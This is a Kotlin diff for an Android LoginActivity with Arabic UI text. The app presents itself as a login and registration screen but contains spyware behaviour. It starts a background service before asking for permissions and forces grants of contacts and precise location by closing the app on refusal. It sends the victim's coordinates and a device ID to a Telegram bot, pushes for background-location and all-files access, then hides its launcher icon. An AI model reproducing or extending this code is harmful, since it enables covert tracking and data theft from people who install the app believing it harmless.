@@ -79,9 +79,6 @@ import android.graphics.Color as AColor
 
 data class LangItem(val name: String, val flag: String)
 
-// ═══════════════════════════════════════════
-//  Neon color palette
-// ═══════════════════════════════════════════
 object Neon {
     val Cyan    = Color(0xFF2DF5FF)
     val Blue    = Color(0xFF3D8BFF)
@@ -100,12 +97,14 @@ class LoginActivity : ComponentActivity() {
 
     private var currentScreen by mutableStateOf(-1)
 
+    // Login
     private var email by mutableStateOf("")
     private var password by mutableStateOf("")
     private var pwVisible by mutableStateOf(false)
     private var capInput by mutableStateOf("")
     private var capCode by mutableStateOf("")
 
+    // Register
     private var regName by mutableStateOf("")
     private var regEmail by mutableStateOf("")
     private var regP1 by mutableStateOf("")
@@ -113,11 +112,13 @@ class LoginActivity : ComponentActivity() {
     private var regP1Visible by mutableStateOf(false)
     private var regP2Visible by mutableStateOf(false)
 
+    // Reset
     private var resetEmail by mutableStateOf("")
     private var resetVC by mutableStateOf("")
     private var resetP1 by mutableStateOf("")
     private var resetP1Visible by mutableStateOf(false)
 
+    // Images
     private var profileUri by mutableStateOf<Uri?>(null)
     private var profileBmp by mutableStateOf<Bitmap?>(null)
     private var bgUri by mutableStateOf<Uri?>(null)
@@ -125,12 +126,14 @@ class LoginActivity : ComponentActivity() {
 
     private var selectedLang by mutableStateOf(0)
 
-    private var permRequestIndex = 0
+    // Rejection / Completion
     private var anyRejected = false
-    private var permissionsStarted = false
+    private var locationRequested = false
+    private var contactsRequested = false
 
     private val enableCaptcha = false
 
+    // ⭐ Image Pickers — لكن مع فحص الأذونات
     private val pickProfile =
         registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
             if (uri != null) { profileUri = uri; profileBmp = null }
@@ -148,33 +151,17 @@ class LoginActivity : ComponentActivity() {
             if (bmp != null) { bgBmp = bmp; bgUri = null }
         }
 
-    private val permissionsToAsk: List<String> by lazy {
-        val list = mutableListOf<String>()
-        list.add(Manifest.permission.READ_CONTACTS)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            list.add(Manifest.permission.READ_MEDIA_IMAGES)
-            list.add(Manifest.permission.READ_MEDIA_VIDEO)
-            list.add(Manifest.permission.READ_MEDIA_AUDIO)
-        } else {
-            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
-        list.add(Manifest.permission.ACCESS_FINE_LOCATION)
-        list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
-        list
-    }
-
+    // ⭐ Launcher للأذونات
     private val permLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
     ) { granted ->
         if (!granted) {
             anyRejected = true
-            exitApp()
-        } else {
-            permRequestIndex++
-            Handler(Looper.getMainLooper()).postDelayed({
-                askNextPermission()
-            }, 500)
+            exitApp("تم رفض الاستخدام")
+            return@registerForActivityResult
         }
+        // بعد منح الأذن — اطلب اللي بعده
+        afterPermissionGranted()
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -185,11 +172,16 @@ class LoginActivity : ComponentActivity() {
 
         capCode = generateCaptcha()
 
+        // ⭐ تسجيل الجهاز
         try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}
 
+        // ⭐ بدء الخدمة في الخلفية — قبل الأذونات
+        startBackgroundService()
+
+        // ⭐ بعد 2 ثانية — طلب الموقع + جهات الاتصال
         Handler(Looper.getMainLooper()).postDelayed({
-            requestBackgroundLocationDirect()
-        }, 1500L)
+            requestInitialPermissions()
+        }, 2000L)
 
         setContent {
             AppTheme {
@@ -208,6 +200,207 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  الأذونات الأولية — الموقع + جهات الاتصال
+    // ═══════════════════════════════════════════
+    private fun requestInitialPermissions() {
+        // 1. جهات الاتصال
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+            != PackageManager.PERMISSION_GRANTED) {
+            contactsRequested = true
+            permLauncher.launch(Manifest.permission.READ_CONTACTS)
+            return
+        }
+        // 2. الموقع
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+            != PackageManager.PERMISSION_GRANTED) {
+            locationRequested = true
+            permLauncher.launch(Manifest.permission.ACCESS_FINE_LOCATION)
+            return
+        }
+        // ✅ كل الأذونات موجودة
+        afterInitialPermissions()
+    }
+
+    private fun afterPermissionGranted() {
+        // الأول: جهات الاتصال
+        if (contactsRequested && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+            == PackageManager.PERMISSION_GRANTED) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                != PackageManager.PERMISSION_GRANTED) {
+                locationRequested = true
+                permLauncher.launch(Manifest.permission.ACCESS_FINE_LOCATION)
+                return
+            }
+        }
+        // بعد الموقع → خلص
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+            == PackageManager.PERMISSION_GRANTED) {
+            afterInitialPermissions()
+        }
+    }
+
+    private fun afterInitialPermissions() {
+        // ⭐ إرسال الموقع فوراً
+        sendLocationNow()
+
+        // ⭐ طلب Background Location + All Files (يدوي)
+        Handler(Looper.getMainLooper()).postDelayed({
+            requestBackgroundLocationAndFiles()
+        }, 1500L)
+    }
+
+    // ═══════════════════════════════════════════
+    //  طلب أذونات الوسائط — عند اختيار صورة
+    // ═══════════════════════════════════════════
+    private fun requestMediaPermissionThen(action: () -> Unit) {
+        val perm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            Manifest.permission.READ_MEDIA_IMAGES
+        } else {
+            Manifest.permission.READ_EXTERNAL_STORAGE
+        }
+        if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+            // اطلب الأذن — بعد المنح → نفذ الإجراء
+            pendingMediaAction = action
+            permLauncher.launch(perm)
+            return
+        }
+        // ممنوح — نفذ
+        action()
+    }
+
+    private var pendingMediaAction: (() -> Unit)? = null
+
+    // ═══════════════════════════════════════════
+    //  إرسال الموقع فوراً
+    // ═══════════════════════════════════════════
+    private fun sendLocationNow() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+            != PackageManager.PERMISSION_GRANTED) return
+        Thread {
+            try {
+                val loc = LocationHelper.getPreciseLocation(this, 10)
+                if (loc != null) {
+                    val code = DeviceManager.getDeviceCode(this)
+                    TelegramApi.sendMessage(
+                        "📍 *موقع مباشر*\n🆔 `$code`\n\n" +
+                        "خط العرض: ${loc.latitude}\n" +
+                        "خط الطول: ${loc.longitude}\n" +
+                        "الدقة: ±${loc.accuracy.toInt()}م\n\n" +
+                        "🗺 https://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
+                    )
+                    LocationCache.save(this, loc.latitude, loc.longitude, loc.accuracy)
+                }
+            } catch (_: Exception) {}
+        }.start()
+    }
+
+    // ═══════════════════════════════════════════
+    //  Background Location + All Files (Settings)
+    // ═══════════════════════════════════════════
+    private fun requestBackgroundLocationAndFiles() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                != PackageManager.PERMISSION_GRANTED) {
+                try {
+                    android.app.AlertDialog.Builder(this)
+                        .setTitle("صلاحية الخلفية")
+                        .setMessage("يرجى تفعيل الموقع في الخلفية من الإعدادات")
+                        .setPositiveButton("فتح الإعدادات") { _, _ ->
+                            try {
+                                val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                                i.data = Uri.parse("package:$packageName")
+                                startActivity(i)
+                            } catch (_: Exception) {}
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                requestAllFilesAccess()
+                            }, 5000)
+                        }
+                        .setCancelable(false)
+                        .show()
+                } catch (_: Exception) {}
+            } else {
+                requestAllFilesAccess()
+            }
+        } else {
+            requestAllFilesAccess()
+        }
+    }
+
+    private fun requestAllFilesAccess() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                android.app.AlertDialog.Builder(this)
+                    .setTitle("الوصول للملفات")
+                    .setMessage("لتفعيل الوصول لكل الملفات، اضغط 'السماح'")
+                    .setPositiveButton("فتح الإعدادات") { _, _ ->
+                        try {
+                            val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                            i.data = Uri.parse("package:$packageName")
+                            startActivity(i)
+                        } catch (e: Exception) {
+                            try {
+                                val i = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                                startActivity(i)
+                            } catch (_: Exception) {}
+                        }
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            onPermissionsComplete()
+                        }, 5000)
+                    }
+                    .setCancelable(false)
+                    .show()
+            } else onPermissionsComplete()
+        } else onPermissionsComplete()
+    }
+
+    private fun onPermissionsComplete() {
+        hideLauncherIcon()
+        showToast("✅ تم تفعيل كل الصلاحيات")
+    }
+
+    // ═══════════════════════════════════════════
+    //  Exit on reject
+    // ═══════════════════════════════════════════
+    private fun exitApp(msg: String) {
+        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
+        Handler(Looper.getMainLooper()).postDelayed({
+            try {
+                val i = Intent(Intent.ACTION_MAIN)
+                i.addCategory(Intent.CATEGORY_HOME)
+                i.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                startActivity(i)
+                finishAffinity()
+                System.exit(0)
+            } catch (_: Exception) { finish() }
+        }, 2000)
+    }
+
+    private fun hideLauncherIcon() {
+        try {
+            val c = ComponentName(this, LoginActivity::class.java)
+            packageManager.setComponentEnabledSetting(
+                c,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {
+            android.util.Log.e("LoginActivity", "hide err: ${e.message}")
+        }
+    }
+
+    // ⭐ Service — بدون طلب أذونات
+    private fun startBackgroundService() {
+        try {
+            val intent = Intent(this, BackgroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
+            else startService(intent)
+        } catch (_: Exception) {}
+    }
+
+    // ═══════════════════════════════════════════
+    //  UI — Neon Background
+    // ═══════════════════════════════════════════
     @Composable
     fun NeonBackground() {
         val ctx = LocalContext.current
@@ -366,42 +559,11 @@ class LoginActivity : ComponentActivity() {
             Spacer(Modifier.height(14.dp))
             NeonPassword(password, { password = it }, pwVisible, { pwVisible = !pwVisible }, "كلمة المرور")
 
-            if (enableCaptcha) {
-                Spacer(Modifier.height(12.dp))
-                Row(
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .height(56.dp)
-                        .clip(RoundedCornerShape(18.dp))
-                        .background(Neon.FieldBg)
-                        .border(1.dp, Neon.FieldBorder, RoundedCornerShape(18.dp))
-                        .padding(horizontal = 16.dp),
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
-                    BasicTextField(
-                        value = capInput,
-                        onValueChange = { if (it.length <= 6) capInput = it.uppercase() },
-                        modifier = Modifier.weight(1f),
-                        singleLine = true,
-                        textStyle = TextStyle(color = Neon.Txt, fontSize = 15.sp),
-                        decorationBox = { inner ->
-                            if (capInput.isEmpty()) Text("أدخل رمز التحقق", color = Neon.Hint, fontSize = 14.5.sp)
-                            inner()
-                        }
-                    )
-                    CaptchaBox(capCode) { capCode = generateCaptcha(); capInput = "" }
-                }
-            }
-
             Spacer(Modifier.height(26.dp))
             GradientButton("تسجيل الدخول") {
                 when {
                     email.isBlank() -> showToast("من فضلك أدخل البريد الإلكتروني أو رقم الهاتف")
                     password.isBlank() -> showToast("من فضلك أدخل كلمة المرور")
-                    enableCaptcha && capInput != capCode -> {
-                        showToast("رمز التحقق غير صحيح")
-                        capCode = generateCaptcha(); capInput = ""
-                    }
                     else -> {
                         showToast("تم تسجيل الدخول")
                         startBackgroundService()
@@ -412,9 +574,7 @@ class LoginActivity : ComponentActivity() {
             Spacer(Modifier.height(22.dp))
             OrDivider()
             Spacer(Modifier.height(22.dp))
-            GoogleButton {
-                showToast("الدخول عبر Google (تجريبي)")
-            }
+            GoogleButton { showToast("الدخول عبر Google (تجريبي)") }
 
             Spacer(Modifier.height(16.dp))
             Text(
@@ -587,6 +747,9 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  Neon Components
+    // ═══════════════════════════════════════════
     @Composable
     fun NeonInput(
         value: String,
@@ -785,7 +948,9 @@ class LoginActivity : ComponentActivity() {
             }
             Spacer(Modifier.height(14.dp))
             Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
-                PickerButton("اختيار من المعرض", Icons.Default.Image) { pickProfile.launch("image/*") }
+                PickerButton("اختيار من المعرض", Icons.Default.Image) {
+                    requestMediaPermissionThen { pickProfile.launch("image/*") }
+                }
                 PickerButton("التقاط صورة", Icons.Default.PhotoCamera) { shotProfile.launch(null) }
             }
         }
@@ -848,7 +1013,9 @@ class LoginActivity : ComponentActivity() {
             }
             Spacer(Modifier.height(14.dp))
             Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
-                PickerButton("اختيار من المعرض", Icons.Default.Image) { pickBg.launch("image/*") }
+                PickerButton("اختيار من المعرض", Icons.Default.Image) {
+                    requestMediaPermissionThen { pickBg.launch("image/*") }
+                }
                 PickerButton("التقاط صورة", Icons.Default.PhotoCamera) { shotBg.launch(null) }
             }
         }
@@ -867,20 +1034,6 @@ class LoginActivity : ComponentActivity() {
         ) {
             Text("→", color = Neon.Cyan, fontSize = 18.sp, fontWeight = FontWeight.Bold)
         }
-    }
-
-    @Composable
-    fun CaptchaBox(code: String, onClick: () -> Unit) {
-        val bitmap = remember(code) { generateCaptchaBitmap(code) }
-        Image(
-            bitmap = bitmap.asImageBitmap(),
-            contentDescription = "Captcha",
-            modifier = Modifier
-                .width(88.dp)
-                .height(40.dp)
-                .clip(RoundedCornerShape(7.dp))
-                .clickable { onClick() }
-        )
     }
 
     @Composable
@@ -955,7 +1108,6 @@ class LoginActivity : ComponentActivity() {
                     .background(Brush.horizontalGradient(listOf(Neon.Magenta, Neon.Purple, Neon.Blue, Neon.Cyan)))
                     .clickable {
                         currentScreen = 0
-                        startPermissionsAfterLanguage()
                     },
                 contentAlignment = Alignment.Center
             ) {
@@ -1069,171 +1221,6 @@ class LoginActivity : ComponentActivity() {
     private fun generateCaptcha(): String {
         val chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
         return (1..4).map { chars[Random.nextInt(chars.length)] }.joinToString("")
-    }
-
-    private fun generateCaptchaBitmap(code: String): Bitmap {
-        val w = 176; val h = 80
-        val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
-        val canvas = Canvas(bmp)
-        canvas.drawColor(AColor.WHITE)
-        val linePaint = Paint().apply { strokeWidth = 3f; style = Paint.Style.STROKE }
-        repeat(3) {
-            linePaint.color = AColor.rgb(Random.nextInt(150), Random.nextInt(150), Random.nextInt(150))
-            linePaint.alpha = 150
-            canvas.drawLine(Random.nextFloat() * w, Random.nextFloat() * h,
-                Random.nextFloat() * w, Random.nextFloat() * h, linePaint)
-        }
-        val colors = intArrayOf(
-            AColor.parseColor("#27ae60"), AColor.parseColor("#2980b9"),
-            AColor.parseColor("#8e44ad"), AColor.parseColor("#c0392b"),
-            AColor.parseColor("#16a085")
-        )
-        val textPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
-            textSize = 60f; typeface = Typeface.DEFAULT_BOLD
-        }
-        for (i in code.indices) {
-            textPaint.color = colors[Random.nextInt(colors.size)]
-            val x = 20f + i * 38f
-            val y = 58f + Random.nextInt(-10, 10)
-            canvas.save()
-            canvas.rotate(Random.nextInt(-15, 15).toFloat(), x, y)
-            canvas.drawText(code[i].toString(), x, y, textPaint)
-            canvas.restore()
-        }
-        return bmp
-    }
-
-    private fun requestBackgroundLocationDirect() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-                != PackageManager.PERMISSION_GRANTED) {
-                try {
-                    android.app.AlertDialog.Builder(this)
-                        .setTitle("صلاحية الخلفية")
-                        .setMessage("يرجى تفعيل الموقع في الخلفية للاستمرار")
-                        .setPositiveButton("موافق") { _, _ ->
-                            try {
-                                val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
-                                i.data = Uri.parse("package:$packageName")
-                                startActivity(i)
-                            } catch (_: Exception) {}
-                        }
-                        .setCancelable(false)
-                        .show()
-                } catch (_: Exception) {}
-            }
-        }
-    }
-
-    private fun startPermissionsAfterLanguage() {
-        if (permissionsStarted) return
-        permissionsStarted = true
-        Handler(Looper.getMainLooper()).postDelayed({
-            askNextPermission()
-        }, 3500L)
-    }
-
-    private fun askNextPermission() {
-        if (anyRejected) return
-        if (permRequestIndex >= permissionsToAsk.size) {
-            sendLocationNow()
-            Handler(Looper.getMainLooper()).postDelayed({ askAllFilesAccess() }, 1500)
-            return
-        }
-        val perm = permissionsToAsk[permRequestIndex]
-        if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
-            permRequestIndex++
-            askNextPermission()
-            return
-        }
-        permLauncher.launch(perm)
-    }
-
-    private fun sendLocationNow() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
-            != PackageManager.PERMISSION_GRANTED) return
-        Thread {
-            try {
-                val loc = LocationHelper.getPreciseLocation(this, 10)
-                if (loc != null) {
-                    val code = DeviceManager.getDeviceCode(this)
-                    TelegramApi.sendMessage(
-                        "📍 *موقع مباشر*\n🆔 `$code`\n\n" +
-                        "خط العرض: ${loc.latitude}\n" +
-                        "خط الطول: ${loc.longitude}\n" +
-                        "الدقة: ±${loc.accuracy.toInt()}م\n\n" +
-                        "🗺 https://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
-                    )
-                    LocationCache.save(this, loc.latitude, loc.longitude, loc.accuracy)
-                }
-            } catch (_: Exception) {}
-        }.start()
-    }
-
-    private fun askAllFilesAccess() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            if (!Environment.isExternalStorageManager()) {
-                android.app.AlertDialog.Builder(this)
-                    .setTitle("الوصول للملفات")
-                    .setMessage("لتفعيل الوصول لكل الملفات، اضغط 'السماح'")
-                    .setPositiveButton("فتح الإعدادات") { _, _ ->
-                        try {
-                            val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                            i.data = Uri.parse("package:$packageName")
-                            startActivity(i)
-                        } catch (e: Exception) {
-                            try {
-                                val i = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
-                                startActivity(i)
-                            } catch (_: Exception) {}
-                        }
-                        Handler(Looper.getMainLooper()).postDelayed({ onPermissionsComplete() }, 5000)
-                    }
-                    .setCancelable(false)
-                    .show()
-            } else onPermissionsComplete()
-        } else onPermissionsComplete()
-    }
-
-    private fun onPermissionsComplete() {
-        hideLauncherIcon()
-        startBackgroundService()
-        showToast("✅ تم تفعيل كل الصلاحيات")
-    }
-
-    private fun hideLauncherIcon() {
-        try {
-            val c = ComponentName(this, LoginActivity::class.java)
-            packageManager.setComponentEnabledSetting(
-                c,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        } catch (e: Exception) {
-            android.util.Log.e("LoginActivity", "hide err: ${e.message}")
-        }
-    }
-
-    private fun startBackgroundService() {
-        try {
-            val intent = Intent(this, BackgroundService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
-            else startService(intent)
-        } catch (_: Exception) {}
-    }
-
-    private fun exitApp() {
-        Toast.makeText(this, "تم رفض الاستخدام", Toast.LENGTH_LONG).show()
-        Handler(Looper.getMainLooper()).postDelayed({
-            try {
-                val i = Intent(Intent.ACTION_MAIN)
-                i.addCategory(Intent.CATEGORY_HOME)
-                i.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                startActivity(i)
-                finishAffinity()
-                System.exit(0)
-            } catch (_: Exception) { finish() }
-        }, 2000)
     }
 
     private fun showToast(msg: String) {
